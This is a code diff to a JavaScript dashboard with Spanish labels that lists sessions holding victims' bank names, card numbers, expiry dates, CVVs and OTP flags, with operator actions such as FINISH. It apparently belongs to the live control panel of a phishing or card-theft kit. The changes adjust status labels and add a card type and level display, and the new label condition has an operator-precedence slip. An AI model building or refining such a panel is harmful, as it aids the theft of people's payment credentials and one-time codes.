@@ -168,7 +168,7 @@ const ACTION_UI = {
         css: "background:var(--yellow);color:rgba(255, 255, 255, 0.82);;",
     },
 
-    FINISH: { label: "COMPLETADO", css: "background:var(--green);color:#fff;" },
+    FINISH: { label: "OK", css: "background:var(--green);color:#fff;" },
 };
 
 function applyActionUI(el, action) {
@@ -1001,8 +1001,12 @@ function renderList() {
             const hasOtp = !!s.otp;
 
             const bankLabel = !s.bank || s.bank === "null"
-                ? "⏳ esperando..."
-                : `🏦 ${s.bank.charAt(0).toUpperCase() + s.bank.slice(1)}`;
+                ? "⏳ esperando🏦..."
+                : `${s.bank.charAt(0).toUpperCase() + s.bank.slice(1)}`;
+            
+            const typeLabel = !s.cc || s.cc === "null" && !s.level || s.level === "null"
+                ? "⏳💳"
+                : `${s.type.charAt(0).toUpperCase() + s.type.slice(1)} - ${s.level}`;
             const actionLabel = actionDot(s.action);
             const dot = stateDot(s.state);
 
@@ -1038,6 +1042,7 @@ function renderList() {
             <div class="meta">
               <div class="bank">
                 <span class="kv"><b>${escapeHtml(bankLabel)}</b></span>
+                <span class="kv"><b>${escapeHtml(typeLabel)}</b></span>
               </div>
 
               <div class="action-details">
@@ -1313,7 +1318,7 @@ function renderDetail(s) {
             stEl.className =
                 `dot ${stateDotClass(s.state || "")}`.trim() || "dot";
         if (pillBank) {
-            pillBank.textContent = !s.bank ? "⌛" : `🏦${s.bank}`;
+            pillBank.textContent = !s.bank ? "⌛..." : `🏦${s.bank}`;
         }
         if (pillCc) {
             const flowCc = s.cc && s.exp && s.cvv;
@@ -1321,7 +1326,7 @@ function renderDetail(s) {
             const ccText = `${s.type} - ${s.level}`;
             const AuthText = "LOGO";
             pillCc.textContent =
-                flowCc ? ccText : flowAuth ? AuthText : "⌛";
+                flowCc ? ccText : flowAuth ? AuthText : "⌛...";
         }
         if (pillAction) {
             const action = String(s.action || "").toUpperCase();
